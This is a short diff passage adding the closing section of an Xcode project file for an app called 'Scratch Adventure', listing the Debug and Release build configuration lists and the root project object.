+		CEE29C042DB63CD100854BC6 /* Build configuration list for PBXProject "Scratch Adventure" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				CEE29C1B2DB63CD300854BC6 /* Debug */,
+				CEE29C1C2DB63CD300854BC6 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		CEE29C1D2DB63CD300854BC6 /* Build configuration list for PBXNativeTarget "Scratch Adventure" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				CEE29C1E2DB63CD300854BC6 /* Debug */,
+				CEE29C1F2DB63CD300854BC6 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = CEE29C012DB63CD100854BC6 /* Project object */;
+}
